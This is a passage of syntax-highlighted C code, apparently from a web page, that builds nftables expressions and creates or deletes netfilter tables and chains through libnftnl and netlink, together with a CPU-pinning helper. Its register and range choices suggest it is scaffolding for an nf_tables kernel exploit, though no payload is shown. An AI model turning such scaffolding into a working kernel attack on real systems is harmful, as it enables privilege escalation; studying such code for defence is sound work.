</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_RANGE_SREG, NFT_REG_4);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_RANGE_OP, NFT_RANGE_NEQ);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTA_RANGE_FROM_DATA, <span style="color:#ae81ff">0xff</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTA_RANGE_TO_DATA, <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, expr);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_bitwise</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> bitmask){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span> expr <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;bitwise&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_SREG, NFT_REG_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_DREG, NFT_REG_4);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_OP, NFTA_BITWISE_DATA);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_LEN, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_MASK, bitmask);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_BITWISE_DATA, <span style="color:#ae81ff">0x2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, expr);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mov_imm</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> dreg, <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span> data, <span style="color:#66d9ef">uint32_t</span> datalen)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;immediate&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr imm oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set</span>(e,NFTNL_EXPR_IMM_DATA,data,datalen);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_osf</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> dreg, <span style="color:#66d9ef">uint8_t</span> ttl,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">uint32_t</span> flags)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;osf&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr osf oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_OSF_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u8</span>(e, NFTNL_EXPR_OSF_TTL, ttl);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_OSF_FLAGS, flags);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pin_cpu</span>(<span style="color:#66d9ef">int</span> cpu)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">cpu_set_t</span> set;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>set);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CPU_SET</span>(cpu, <span style="color:#f92672">&amp;</span>set);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>set)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_table</span>(<span style="color:#66d9ef">uint32_t</span> protocol, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">bool</span> delete){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, table_seq, chain_seq, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_table <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_table_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;nftnl_table_alloc&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_set_u32</span>(t, NFTNL_TABLE_FAMILY, protocol);  
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_set_str</span>(t, NFTNL_TABLE_NAME, table_name);
</span></span><span style="display:flex;"><span>	batching <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_batch_is_supported</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;cannot talk to nfnetlink&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	table_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_table_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			delete<span style="color:#f92672">?</span>NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>			NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, table_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_chain</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain_name, <span style="color:#66d9ef">uint32_t</span> hook_num){  <span style="color:#75715e">// NF_INET_LOCAL_IN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, chain_seq;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_TABLE, table_name);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_NAME, chain_name);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hook_num <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_chain_set_u32</span>(t, NFTNL_CHAIN_HOOKNUM, hook_num);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_u32</span>(t, NFTNL_CHAIN_PRIO, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	batching <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_batch_is_supported</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;cannot talk to nfnetlink&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	chain_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>			NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, chain_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">delete_chain</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain_name){ 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, chain_seq;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_TABLE, table_name);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_NAME, chain_name);
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	chain_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>					NFT_MSG_DELCHAIN, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>					NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, chain_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
